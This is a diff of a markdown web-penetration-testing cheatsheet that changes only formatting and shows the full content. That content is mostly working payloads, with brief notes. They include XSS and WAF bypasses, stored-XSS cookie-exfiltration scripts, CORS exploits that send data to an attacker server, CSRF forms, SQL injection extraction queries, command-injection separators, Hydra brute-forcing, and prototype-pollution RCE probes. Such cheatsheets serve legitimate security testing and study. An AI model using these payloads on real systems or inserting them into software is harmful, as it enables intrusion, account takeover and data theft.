@@ -1,7 +1,4 @@
-Title: Web Cheatsheet
-Slug: web/cheatsheet
-Date: 1957-01-01 00:00
-Category: Cheatsheet
+# Web Cheatsheet
 
 ## Information Gathering
 
@@ -13,7 +10,7 @@ Enumerate server technology by 404 page; see [this](https://0xdf.gitlab.io/cheat
 
 Administrative default pages:
 
-~~~
+```
 ?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Flogin&saveLastPath=false
 
 ?p_p_id=com_liferay_login_web_portlet_LoginPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_login_web_portlet_LoginPortlet_mvcRenderCommandName=%2Flogin%2Fcreate_account&saveLastPath=false
@@ -25,7 +22,7 @@ Administrative default pages:
 /portal/invoker
 
 /api/jsonws
-~~~
+```
 
 ### Wordpress
 
@@ -73,36 +70,36 @@ Wordpress Nmap Scripts:
 
 Interesting endpoints: 
 
-~~~
+```
 /api
 /swagger/index.html
 /openapi.json
 /api/swagger/v1
 /api/swagger
 /openapi/ui/
-~~~
+```
 
 When fuzzing API endpoint via **SSRF** or **Server-Side Parameter Pollution**, it's worth trying to append a `%23` (URL-Encoded #) to break the URL parsing when the server is appending some stuff AFTER the injected payload:
 
-~~~
+```
 https://vulnerablesite/path_before/{{injection_point}}/{{?query_params or path slices appendend by the server}}
-~~~
+```
 
 ## Bruteforcing
 
 Brute-force HTTP POST form with Hydra:
 
-~~~
+```
 hydra -c 1 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.118 http-form-post '/admin/:username=^USER^&password=^PASS^:Login'
-~~~
+```
 
 Interesting not common endpoints:
 
-~~~
+```
 /_vti_pvt/service.pwd # https://stackoverflow.com/questions/1163820/what-are-vti-cnf-vti-pvt-vti-script-and-vti-txt-folders
 /__better_errors # https://github.com/BetterErrors/better_errors?tab=readme-ov-file#better-errors - Debug console can allow RCE
 home/000~ROOT~000 # https://github.com/stefanpejcic/wordpress-malware/blob/9b74dec23ed0e8041f9c49de1fcd568f5342796e/23.10.2020/sy.php - Symlink attack already carried out by other attackers
-~~~
+```
 ## Broken Access Control
 
 Here's a list of worth-to-try restriction bypasses:
@@ -118,7 +115,7 @@ Here's a list of worth-to-try restriction bypasses:
 
 Basic template:
 
-~~~html
+```html
 <head>
 	<style>
 		#target_website {
@@ -144,19 +141,19 @@ Basic template:
 	<iframe id="target_website" src="https://vulnerable-website.com">
 	</iframe>
 </body>
-~~~
+```
 
 To bypass frame busting scripts, it's useful to use the iframe `sandbox` attribute with the `allow-forms`, `allow-scripts`, `allow-top-navigation`; when these values are set, the irame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
 
-~~~html
+```html
 <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-script allow-top-navigation"></iframe>
-~~~
+```
 
 ## Command Injection
 
 Basic payloads:
 
-~~~shell
+```shell
 & command &
 && command &&
 ; command ;
@@ -168,16 +165,16 @@ Basic payloads:
 # newline
 0x0a 
 \n
-~~~
+```
 
 Time-base feedback for Blind OS command-injection to exfiltrate data, eventually URL Encoded:
 
-~~~bash
+```bash
 # > whoami
 # jack
 
 c=$(whoami) && if [[ "$c" =~ "ja" ]]; then sleep 2;fi 
-~~~
+```
 
 
 ## Content Security Policy
@@ -188,23 +185,23 @@ It's possible to bypass a CSP like `default-src 'none'; base-uri 'none';` by exp
 
 An attacker could somehow make the user click on a `<a>`; being the `target` attribute for the `<base>` tag dangling, its value (so the `window.name`) will contain the HTML code following the dangling attribute until a closing quote is found, allowing to partially exfiltrate the page content. 
 
-~~~html
+```html
 <a href=http://evilsite>You must click me</a><base target="
-~~~
+```
 
 Note: **if the double quote `"` does not work, try with a single quote `'`.**
 
 Edge will drop the entire policy when it encounters invalid syntax; if some user controllable input gets reflected in the CSP, when using edge it's sufficient to inject some breaking characters such as `;_` in order to make the whole CSP be dropped.
 
-~~~
+```
 https://vulnerablesite?values=etc&token=SOME_REFLECTED_VALUE;_
-~~~
+```
 
 With Chrome/Firefox this is not possible; instead it's possible to overwrite `script-src` by injecting the `script-src-elem` directive which specifies which controls only script blocks and not also inline event handlers, differently from `script-src`.
 
-~~~
+```
 http://vulnerablesite?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://evilsite/xss.js%22%3E%3C/script%3E
-~~~
+```
 
 Bypass `form-action` directive:
 [CSP form-action Bypass with reflected XSS ](https://labs.detectify.com/ethical-hacking/content-security-policy-csp-bypassing-form-action-with-reflected-xss/)
@@ -213,7 +210,7 @@ Bypass `form-action` directive:
 
 Some payloads:
 
-~~~
+```
 /%%0a0aSet-Cookie:crlf=injection
 /%0aSet-Cookie:crlf=injection
 /%0d%0aSet-Cookie:crlf=injection
@@ -231,7 +228,7 @@ Some payloads:
 /%3f%0d%0aSet-Cookie:crlf=injection
 /%3f%0dSet-Cookie:crlf=injection
 /%u000aSet-Cookie:crlf=injection
-~~~
+```
 ## Cross-Origin Resource Sharing (CORS)
 
 `GET`and  `HEAD` requests do not generally require a preflight `OPTION` request.
@@ -245,7 +242,7 @@ This is relevant since a server may accept arbitrary origins for `POST` requests
 
 Exploit CORS misconfiguration with `fetch` to exfiltrate data to an attacker controlled server:
 
-~~~javascript
+```javascript
 fetch("http://concord:8001/api/service/console/whoami", {
 		credentials: 'include'
 	})
@@ -253,7 +250,7 @@ fetch("http://concord:8001/api/service/console/whoami", {
 		let data = await response.text();
 		fetch("http://<attacker controlled server>/?data=" + atob(data))
 	})
-~~~
+```
 
 
 `Access-Control-Allow-Origin` (ACAO) is set to null for:
@@ -265,7 +262,7 @@ fetch("http://concord:8001/api/service/console/whoami", {
 
 It's possible to use sandboxed `iframe` to generate a cross-origin request with the `null` Origin:
 
-~~~html
+```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -277,13 +274,13 @@ function reqListener() {
 location='malicious-website.com/log?key='+this.responseText;
 };
 </script>"></iframe>
-~~~
+```
 
 ## Cross-Site Request Forgery (CSRF)
 
 CSRF Payload setting up a file into the form to be submitted:
 
-~~~html
+```html
 <html>
 
 <head>
@@ -321,7 +318,7 @@ CSRF Payload setting up a file into the form to be submitted:
 </body>
 
 </html>
-~~~
+```
 ### SameSite Cookies
 
 Some applications do not validate that the token belongs to the same session as the user who is making the request.
@@ -347,9 +344,9 @@ SameSite supports three restriction levels:
 
 These levels can be explicitly set in the cookie definition with the `SameSite` attribute:
 
-~~~
+```
 Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
-~~~
+```
 
 Generally, `Lax` is the default. When `Lax` is set by default (**not when it's explicited!**), browsers wait 120 seconds for **top-level** `POST` requests before enforce the `Lax` restrictions. This is needed in order to not break SSO mechanisms which involve cross-site requests.
 
@@ -368,13 +365,13 @@ It's possible to bypass a `Lax` SameSite policy by forcing the request method to
 
 *Symfony* supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:
 
-~~~html
+```html
 <form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
     <input type="hidden" name="_method" value="GET">
     <input type="hidden" name="recipient" value="hacker">
     <input type="hidden" name="amount" value="1000000">
 </form>
-~~~
+```
 
 Note: Other frameworks support a variety of similar parameters.
 
@@ -388,12 +385,12 @@ When dealing with SSO, **if a client-side gadget that enables to refresh the SSO
 
 **Note**: after the refresh the victim should be redirected to the attacker site in order to perform the CSRF attack; this isn't easy feasible. A better approach is to force the browser to open a new tab for the refresh:
 
-~~~javascript
+```javascript
 // use windows.onclick in order to prevent popup to be blocked by default by the browser
 window.onclick = () => {
     window.open('https://vulnerable-website.com/login/sso');
 }
-~~~
+```
 
 #### Referer Bypasses
 
@@ -401,16 +398,16 @@ Some applications validate the `Referer` header when it is present in requests b
 
 Force the browser to drop the `Referer` header by setting the following `<meta>` within the page hosting the CSRF attack:
 
-~~~html
+```html
 <meta name="referrer" content="no-referrer">
-~~~
+```
 
 Modern browsers, in order to attempt to mitigate the risk of data leaking, generally strip query strings from the `Referer` value, which may contain sensitive data.
 This behaviour can be overridden by setting the  header `Referrer-Policy` with the value `unsafe-url`, or by including the following `<meta>`, in the CSRF attack:
 
-~~~html
+```html
 <meta name="referrer" content="unsafe-url">
-~~~
+```
 ## Cross-Site Scripting (XSS)
 
 When using Chrome, from version 92 onward, cross-origin iframes are prevented from calling `alert()`; use instead `print()` for PoC.
@@ -419,15 +416,15 @@ An alternative to `%0D%0A` when space are escaped/encoded is to use the hyphen `
 
 It's possible to force focus on an element by using `iframe` like follows (useful for phishing):
 
-~~~html
+```html
 <iframe src=https://targetvulnerablesite onload="setTimeout(()=>this.src=this.src+'#x',500)">
-~~~
+```
 
 It's also possible to force some user action by using `iframe` like follows:
 
-~~~HTML
+```HTML
 <iframe src =my-account onload = this.contentDocument.forms[1].submit() >
-~~~
+```
 
 Useful resources:
 
@@ -438,7 +435,7 @@ The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor
 
 DOM XSS common sources:
 
-~~~javascript
+```javascript
 document.URL
 document.documentURI
 document.URLUnencoded
@@ -453,11 +450,11 @@ localStorage
 sessionStorage
 IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
 Database
-~~~
+```
 
 DOM XSS common sinks:
 
-~~~javascript
+```javascript
 document.write()
 document.writeln()
 document.domain
@@ -465,16 +462,16 @@ element.innerHTML
 element.outerHTML
 element.insertAdjacentHTML
 element.onevent
-~~~
+```
 
 ### src Attribute XSS
 
 XSS on  `src` attribute:
 
-~~~html
+```html
 <script src="data:,alert(1)"> </script>
 <script src="javascript:new Function['PoC'].find(alert)"></script>
-~~~
+```
 
 
 
@@ -482,7 +479,7 @@ XSS on  `src` attribute:
 
 XSS on hidden-type input:
 
-~~~php
+```php
 // Vulnerable to accesskey + onclick
 // Not vulnerable to type overwriting
 // ?xss=" accesskey=X onclick=alert(1);//
@@ -491,23 +488,23 @@ XSS on hidden-type input:
 // Vulnerable to type overwriting
 // ?xss=" type=image src=x onerror=alert(1);//
 <input value="<?= $_GET['xss'] ?>" type="hidden" /> 
-~~~
+```
 
 Another payload using `oncontentvisibilityautostatechange` attribute (works on Chrome and Edge):
 
-~~~html
+```html
 <input type=hidden
 oncontentvisibilityautostatechange=alert(1)
 style=content-visibility:auto>
-~~~
+```
 
 ### Phone Number Input XSS
 
 If the library parses phone numbers according to RFC and accepts optional parameters such as "phone-context":
 
-~~~html
+```html
 10203040;𝐩𝐡𝐨𝐧𝐞-𝐜𝐨𝐧𝐭𝐞𝐱𝐭=<𝐬𝐜𝐫𝐢𝐩𝐭>𝐚𝐥𝐞𝐫𝐭(1)</𝐬𝐜𝐫𝐢𝐩𝐭>
-~~~
+```
 
 ### Content-Type abuse
 
@@ -515,7 +512,7 @@ Take a look there: [Content-Type that can be used for XSS](https://github.com/Bl
 
 If content-type is `image/svg+xml`:
 
-~~~svg
+```svg
 <!DOCTYPE svg [
 	<!ENTITY lol "alert(1)">
 	<!ENTITY a "data:,&lol;">
@@ -524,20 +521,20 @@ If content-type is `image/svg+xml`:
 <svg width="200" height="188" xmlns="http://www.w3.org/2000/svg">
 	<script href="&a;"></script>
 </svg>
-~~~
+```
 
 ### Javascript URL XSS
 
 When the payload gets reflected into the value of a **Javascript URL** (`javascript:`), even though keys chars such as brackets, single quote, double quotes, etc. reflect in the URL-encoded form, they still might be interpreted and therefore allow to perform XSS attacks:
 
-~~~html
+```html
 <!-- Example: -->
 <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26REFLECTED_VALUE'}).finally(_ => window.location = '/')">
 
 <!-- Even though the single quote is URL-encoded (%27), -->
 <!-- when the javascript: content is interpeted, it breaks the string and allows to inject additional code  -->
 <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,1337},toString%3dx,window%2b%27%27,{x%3a%27'}).finally(_ => window.location = '/')">
-~~~
+```
 
 When there reflection happens in an attribute value, it's possible to use HTML encoding to bypass escaping and filters.
 
@@ -545,7 +542,7 @@ When there reflection happens in an attribute value, it's possible to use HTML e
 
 Common jQuery sinks:
 
-~~~javascript
+```javascript
 add()
 after()
 append()
@@ -567,27 +564,27 @@ init()
 index()
 jQuery.parseHTML()
 $.parseHTML()
-~~~
+```
 
 jQuery can be vulnerable via the `$()` selector sink if the attacker has full control over its input from a source that doesn't require a `#` prefix. The `$()` would create a new DOM element if the specified selector does not exists:
 
-~~~javascript
+```javascript
 $(<injected payload>) // Working
 Example: $('<img src=x onerror=alert(1)>')
 
 $('#' +<injected payload>) // Not Working
 Example: $('#<img src=x onerror=alert(1)>')
-~~~
+```
 
 Exploit jQuery `hashchange` event handler:
 
-~~~javascript
+```javascript
 // Vulnerable Code
 $(window).on('hashchange', function(){
 	var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
 	if (post) post.get(0).scrollIntoView();
 });
-~~~
+```
 
 - **Exploit (Self-XSS)**: Change from `https://vulnreablesite` to `https://vulnreablesite/#<img src=1 onerror=alert(1)>`
 - **Exploit (PoC XSS)**:`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
@@ -598,7 +595,7 @@ Exploit AngularJS `ng-app` directive; if any HTML node has the `ng-app` directiv
 
 Example:
 
-~~~html
+```html
 <html>
 <head>...</head>
 <body>
@@ -611,12 +608,12 @@ Example:
 ...
 </body>
 </html>
-~~~
+```
 
 ### Useful Scripts
 Stored XSS payload exiltrating cookie or making the victim perform some actions:
 
-~~~javascript
+```javascript
 // Cookie exfiltration
 
 window.addEventListener('DOMContentLoaded', (event) => {
@@ -634,11 +631,11 @@ window.addEventListener('DOMContentLoaded', (event) => {
 	xhr.send(formData);
 
 });
-~~~
+```
 
 
 Stored XSS payload making the victim perform some actions:
-~~~javascript
+```javascript
 // www-form-urlencoded + perfom actions
 window.addEventListener('DOMContentLoaded', (event) => {
 
@@ -662,58 +659,58 @@ window.addEventListener('DOMContentLoaded', (event) => {
 	
 	xhr1.send();
 });
-~~~
+```
 
 ### Bypasses
 
 Prepend additional `<`:
 
-~~~html
+```html
 <<script>alert(1)/script>
-~~~
+```
 
 Remove closing tag :
 
-~~~html
+```html
 <script>alert(1)
-~~~
+```
 
 Double open angle brackets:
 
-~~~html
+```html
 <iframe src=http://malicious.com <
-~~~
+```
 
 Use uncommon tags such as `<style>`:
 
-~~~html
+```html
 <STYLE>.classname{background-image:url("javascript:alert('XSS')");}</style>
-~~~
+```
 
 Use extra characters:
 
-~~~html
+```html
 <a aa aaa aaaa aaaaa aaaaaa aaaasaa aaaaaaaa aaaaaasaaa href=javascript:alert(1)>xss</a>
-~~~
+```
 
 Use octal encoding:
 
-~~~html
+```html
 javascript:74163166147401571561541571411447514115414516216450615176
-~~~
+```
 
 
 Uppercase XSS with Unicode entity:
 
-~~~html
+```html
 <SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
-~~~
+```
 
 SVG XSS when all events handler and the href attribute are blocked (requires interaction):
 
-~~~html
+```html
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
-~~~
+```
 
 No parenthesis:
 
@@ -721,7 +718,7 @@ No parenthesis:
 - [The seventh way to calla a javascript function without parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
 - [Executing non-alphanumeric javascript without parenthesis](https://portswigger.net/research/executing-non-alphanumeric-javascript-without-parenthesis)
 
-~~~javascript
+```javascript
 alert`1337` // backticks replace brackets
 
 throw onerror=alert,1337
@@ -737,106 +734,106 @@ valueOf=alert;window+''
 x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
 
 // or any DOMXSS sink such as location=name
-~~~
+```
 
 Polyglots:
 
-~~~HTML
+```HTML
 1'"--><A HRef AutoFocus OnFocus​=alert(1)//> # HTML Context
 1<​/Script><​Script>1/*'/*\'/**//alert(1)// # JS Context
-~~~
+```
 
 HTML entities used as JS variables:
 
-~~~HTML
+```HTML
 <img src=data: onerror=&Xopf;=alert;&Xopf; (1)>
 
 xss"><iframe srcdoc="%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
-~~~
+```
 
 Bypass Akamai, Imperva and CloudFlare:
 
-~~~html
+```html
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
-~~~
+```
 
 Bypass CloudFlare:
 
-~~~html
+```html
 <svg onload=alert&#0000000040document.cookie)>
-~~~
+```
 
 Every HTML tag has the `baseURI` property. Using `<base>` allows you to change the `baseURI`:
 
-~~~HTML
+```HTML
 <base href=x:alert(1) onfocus=eval(baseURI) tabindex=1 style=display:block autofocus>
-~~~
+```
 
 No spaces and quotes abusing regex:
 
-~~~HTML
+```HTML
 <svg/onload=parent [/al/.source+/ert/.source] (1)>
-~~~
+```
 
 No spaces, quotes and + sign abusing regex:
 
-~~~HTML
+```HTML
 <svg/onload=parent(/al/.source.concat(/ert/.source)] (2)>
-~~~
+```
 
 No spaces and using **Zero Width No-Break Space html entity**:
 
-~~~HTML
+```HTML
 <img/src/onerror=alert&#xFEFF;(1)>
-~~~
+```
 
 Using **Reflection**:
 
-~~~HTML
+```HTML
 <a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')
 (Reflect get(document,'coo'+ 'kie'))">
-~~~
+```
 
 Using No spaces + case variation + **double assignment**:
 
-~~~html
+```html
 "><img/src="X"/OnErRor=x=alert`XSS`><!-
-~~~
+```
 
 No `>` and  char limit to 35:
 
-~~~html
+```html
 <svg onload="alert(1)" <="" svg=""
-~~~
+```
 
 HTML encoding:
 
-~~~html
+```html
 <a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;>clickme</a>
-~~~
+```
 
 Use `top`, the top-level window object in browser:
 
-~~~HTML
+```HTML
 javascript:top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);
 
 # URL Encoded with some LF
 %0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A
-~~~
+```
 
 Encoding bypasses:
 
-~~~html
+```html
 %C0%BCscript>alert(1)</script>
 %E0%80%BCscript>alert(1)</script>
 %F0%80%80%BCscript>alert(1)</script>
 %F8%80%80%80%BCscript>alert(1)</script>
 %FC%80%80%80%80%BCscript>alert(1)</script>
-~~~
+```
 
 Miscellaneous payloads:
 
-~~~html
+```html
 <p style="height:100px" onwheel="self['al'+'ert'](self['ev'+'al']
 ('docu'+'ment.coo'+'kie')"></p>
 
@@ -846,7 +843,7 @@ Miscellaneous payloads:
 /*  
 <![CDATA[*]]><![CDATA[/]]>alert(1)-/\*/  
 <​/script>
-~~~
+```
 
 Useful resources:
 
@@ -861,7 +858,7 @@ Reference: [DOM Clobbering - Hacktricks](https://book.hacktricks.xyz/pentesting-
 
 The implementation for the `toString()` for an `a` element is its `href` attribute.
 
-~~~html
+```html
 <!-- Clobber an array/object -->
 <a id=x>
 <a id=x name=y href=somevalue>
@@ -877,13 +874,13 @@ console.log(x.y) //Output: somevalue
 <script>
 alert(x.y.z.value) //Output: somevalue
 </script>
-~~~
+```
 
 **DOM Purify** bypass: DOMPurify allows you to use the `cid:` protocol, which **does not URL-encode double-quotes**. This means you can **inject an encoded double-quote that will be decoded at runtime**. 
 
-~~~html
+```html
 <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
-~~~
+```
  
  In the previous snippet the HTML encoded `&quot;` will be **decoded on runtime** and **escape** from the attribute value to **create** the `**onerror**` event.
 
@@ -891,7 +888,7 @@ alert(x.y.z.value) //Output: somevalue
 
 Common GraphQL endpoints:
 
-~~~
+```
 /graphql
 /api
 /api/graphql
@@ -902,7 +899,7 @@ Common GraphQL endpoints:
 /api/graphql/v1
 /graphql/api/v1
 /graphql/graphql/v1
-~~~
+```
 
 ### Universal Query
 
@@ -923,7 +920,7 @@ It is best practice for introspection to be disabled in production environments,
 
 If introspection is enabled, run the following query to return full details on queries, mutations, subscriptions, types and fragments:
 
-~~~
+```
  #Full introspection query
 
     query IntrospectionQuery {
@@ -1011,7 +1008,7 @@ If introspection is enabled, run the following query to return full details on q
             }
         }
     }
-~~~
+```
 
 **Note**: If introspection is enabled but the above query doesn't run, try removing the `onOperation`, `onFragment`, and `onField` directives from the query structure.
 
@@ -1031,9 +1028,9 @@ Many endpoints will have some sort of rate limiter in place to prevent brute for
 
 General CSV/XLSX formula injection payload:
 
-~~~
+```
 =cmd|' /C calc'!A0
-~~~
+```
 
 ## Host Header Attacks
 
@@ -1051,20 +1048,20 @@ Following some other headers with similar purposes as `X-Forwarded-Host`:
 
 Web servers allow a port to be specified in the Host header, but ignore it for the purpose of deciding which virtual host to pass the request to; it's possible to inject an evil host with the following payload:
 
-~~~
+```
 POST /targeturl HTTP/1.1
 Host: legitmhostname:@evilhostname
-~~~
+```
 
 Sometimes it's possible to bypass IP-based restrictions using the `X-Forwarded-For` or `X-Real-IP` headers.
 
 Another possible approach is to try adding duplicate Host headers, useful when different system are involved and their host header handling is different:
 
-~~~
+```
 GET /targeturl HTTP/1.1
 Host: vulnerable-website.com # <--- Correctly routes the request
 Host: bad-stuff-here # <--- used by the second system
-~~~
+```
 
 A variant to this attack is to indent an host header since it could be ignored by the first system since it's not `^Host: .*$` but processed by the second one.
 
@@ -1072,9 +1069,9 @@ Custom proxies sometimes fail to validate the request line properly, which can a
 
 Example:
 
-~~~
+```
 GET @private-intranet/example HTTP/1.1
-~~~
+```
 
 - The resulting upstream URL will be http://backend-server@private-intranet/example
 
@@ -1093,7 +1090,7 @@ Leak `nginx` internal server name by providing a request with HTTP/1.0 and no `H
 
 Common sinks:
 
-~~~javascript
+```javascript
 eval()
 Function()
 setTimeout()
@@ -1104,7 +1101,7 @@ execScript()
 msSetImmediate()
 range.createContextualFragment()
 crypto.generateCRMFRequest()
-~~~
+```
 
 
 ## JWT Attacks
@@ -1137,9 +1134,9 @@ JWK Sets like this are sometimes exposed publicly via a standard endpoint, such 
 
 If public key is not publicly exposed, it's possible to derive it by using the `jwt_forgery.py` from the [rsa2sign](https://github.com/silentsignal/rsa_sign2n) repository. Alternatively, the following uses the previously mentioned script to derive some possible keys and generate each of them to sign a JWT token:
 
-~~~shell
+```shell
 docker run --rm -it portswigger/sig2n <token1> <token2> 
-~~~
+```
 
 For each possible key, the scripts outputs:
 
@@ -1149,27 +1146,27 @@ For each possible key, the scripts outputs:
 
 Fuzz strings to check if any possible NoSQLi in `$where`:
 
-~~~
+```
 '"`{
 ;$Foo}
 $Foo \xYZ
-~~~
+```
 
 Add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored:
 
-~~~
+```
 https://insecure-website.com/product/lookup?category=fizzy'%00
 
 results in: this.category == 'fizzy'\u0000' && this.released == 1
 
 ' && this.released == 1 are ignored
-~~~
+```
 
 When operator injection is available, it's possible to enumerate an object field name by injection the following payload:
 
-~~~
+```
 "$where":"Object.keys(this)[0].match('^.{0}a.*')"
-~~~
+```
 
 **Note**: field at position 0 should generally be `_id`
 
@@ -1179,10 +1176,10 @@ Useful resource: [https://portswigger.net/web-security/oauth](https://portswigge
 
 Interesting endpoints:
 
-~~~
+```
 /.well-known/oauth-authorization-server
 /.well-known/openid-configuration
-~~~
+```
 
 These will often return a JSON configuration file containing key information, such as details of additional features that may be supported
 
@@ -1227,7 +1224,7 @@ If the application allows **dynamic client registration**, check if it is *unpro
 
 Example of OpenId Connect client registration:
 
-~~~
+```
 POST /openid/register HTTP/1.1
 Content-Type: application/json
 Accept: application/json
@@ -1248,7 +1245,7 @@ Authorization: Bearer ab12cd34ef56gh89
     "userinfo_encrypted_response_enc": "A128CBC-HS256",
     …
 }
-~~~
+```
 
 Some OpenID providers give you the option to pass these in as a JSON web token (JWT) instead. If this feature is supported, you can send a single `request_uri` parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values.
 
@@ -1286,7 +1283,7 @@ For server-side prototype pollution, remember that the `for...in` loops also ove
 
 For example:
 
-~~~json
+```json
 {
 	"address_line_1":"Wiener HQ",
 	"address_line_2":"One Wiener Way",
@@ -1298,7 +1295,7 @@ For example:
 		"isAdmin":true
 	}
 }
-~~~
+```
 
 Detecting server-side prototype pollution without polluted property reflection:
 
@@ -1308,7 +1305,7 @@ Detecting server-side prototype pollution without polluted property reflection:
 
 Following an example of Charset Override to UTF-7 in Express:
 
-~~~json
+```json
 {
     "sessionId":"0123456789",
     "username":"wiener",
@@ -1323,16 +1320,16 @@ Following an example of Charset Override to UTF-7 in Express:
 		}
 	}
 }
-~~~
+```
 
 Example of Node RCE probe:
 
-~~~json
+```json
 "__proto__": {
     "shell":"node",
     "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
 }
-~~~
+```
 
 If the server uses the `fork()` from `child_process` module: 
 
@@ -1340,13 +1337,13 @@ If the server uses the `fork()` from `child_process` module:
 
 Example of Node RCE via `fork()`'s `execArgv` pollution:
 
-~~~json
+```json
 "__proto__": {
 	"execArgv": [
 		"--eval=child_process.execSync('id')"
 	]
 }
-~~~
+```
 
 If the server code runs `execSync` itself, it could be possible to obtain an RCE by polluting the following properties:
 
@@ -1355,12 +1352,12 @@ If the server code runs `execSync` itself, it could be possible to obtain an RCE
 
 Example of RCE via `execSync`:
 
-~~~json
+```json
 "__proto__": {
 	"shell":"vim",
 	"input":":! <command>\n"
 }
-~~~
+```
 
 \*Note:
 
@@ -1395,7 +1392,7 @@ It's possible to relax same-origin policy using `document.domain` by setting a s
 If an attacker has control on the `document.domain`, can manipulate to allow cross-domain interactions toward a domain he controls.
 ## SAML
 
-Refer to: [[attacking-and-exploiting-modern-web-applications#SAML|SAML]]
+Refer to: [SAML](../books/attacking-and-exploiting-modern-web-applications.md#saml)
 
 ## Server-Side Request Forgery (SSRF)
 
@@ -1422,7 +1419,7 @@ Here's a list of some bypasses for **black-list based filters**:
 
 Here's a list of some bypasses for **black-list based filters**:
 
-~~~ 
+```
 https://expected-host:fakepassword@evil-host
 
 https://evil-host#expected-host
@@ -1432,7 +1429,7 @@ https://expected-host.evil-host
 URL Encoder or Double URL Encode filtered strings
 
 Abuse an Open Redirect
-~~~
+```
 
 ## SQL Injection
 
@@ -1440,7 +1437,7 @@ Useful resource: [https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 DB version query:
 
-~~~sql 
+```sql
 Microsoft, MySQL : SELECT @@version
 
 Oracle: SELECT * FROM v$version
@@ -1448,73 +1445,73 @@ Oracle: SELECT * FROM v$version
 PostgreSQL: SELECT version()
 
 SQLite: sqlite_version()
-~~~
+```
 
 Get database name:
 
-~~~sql 
+```sql
 0 UNION SELECT 1,2,database()
-~~~
+```
 
 Get list of tables in db:
 
-~~~sql 
+```sql
 0 UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one
-~~~
+```
 
 Get list of columns in table:
 
-~~~sql 
+```sql
 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
-~~~
+```
 
 Extract information:
 
-~~~sql 
+```sql
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
-~~~
+```
 
 
 Time based check :
 
-~~~sql 
+```sql
 admin123' UNION SELECT SLEEP(5);--
-~~~
+```
 
 Note: If no delay is returned, the number of columns could be wrong.
 
 
 In **UNION-based SQLi**, the columns types must match; NULL is convertable in any (nullable) type and it's useful to enumerate the correct number of columns.
 
-~~~sql 
+```sql
 ' UNION SELECT NULL,NULL,NULL--
-~~~
+```
 
 
 When dealing with **ORACLE** DBs, every SELECT query must be accompanied by the FROM clause and it has to specify a valid table:
 
-~~~sql 
+```sql
 ' UNION SELECT NULL FROM DUAL--
-~~~
+```
 
 With **Blind SQLi** sometimes no feedback is returned regardless of whether the query returns any data. In these cases could be useful to trigger conditional errors; ery often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message.
 
-~~~sql
+```sql
 xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
-~~~
+```
 
 Turn visible some Blind SQLi results - applicable when there's a database error pattern disclosure:
 
-~~~sql
+```sql
 CAST((SELECT example_column FROM example_table) AS int)
-~~~
+```
 
 ## Open Redirect
 
 DOM-based open redirects sinks:
 
-~~~javascript
+```javascript
 location
 location.host
 location.hostname
@@ -1530,53 +1527,53 @@ XMLHttpRequest.open()
 XMLHttpRequest.send()
 jQuery.ajax()
 $.ajax()
-~~~
+```
 
 ### Bypasses
 
 Multiple /:
 
-~~~
+```
 ?url=https:///google.com
-~~~
+```
 
 Space before the url:
 
-~~~
+```
 ?url=+https://google.com
-~~~
+```
 
 Escape char on the second /:
 
-~~~
+```
 ?url=+https:/\/google.com
-~~~
+```
 
 
 `startWith` or `indexOf` "target.com:" 
 
-~~~
+```
 target.com.attacker.com
-~~~
+```
 
 Fake relative: 
 
-~~~
+```
 //attacker.com
-~~~
+```
 
 /\\? before the @:
 
-~~~
+```
 https://attacker.com\@target.com
 https://attacker.com?@target.com
-~~~
+```
 
 Multiline regex: 
 
-~~~
+```
 attacker.com%0d%0atarget.com
-~~~
+```
 
 
 ## File Inclusion
@@ -1585,29 +1582,29 @@ attacker.com%0d%0atarget.com
